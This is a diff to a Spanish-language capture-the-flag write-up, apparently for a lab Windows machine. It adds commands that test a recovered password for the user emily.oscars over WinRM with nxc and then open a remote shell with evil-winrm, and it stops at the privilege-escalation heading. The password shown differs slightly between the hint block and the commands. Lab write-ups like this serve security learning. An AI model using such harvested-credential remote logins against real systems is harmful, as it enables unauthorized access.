@@ -233,6 +233,18 @@ Verificamos si estas son correctas
 ```ad-hint
 emily.oscars::Q!3@Lp#M6b\*7t\*Vtz
 ```
+La contraseña esta escapada
+
+Verificamos si pertenece al grupo de remote management+
+`nxc winrm 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'`
+
+Vemos que si que pertenece al grupo así que nos conectamos 
+`evil-winrm  -i 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'`
+
+Una vez nos hemos conectados habrá que escalar privilegios
+
+
+## Escalada de privilegios
 
 
 
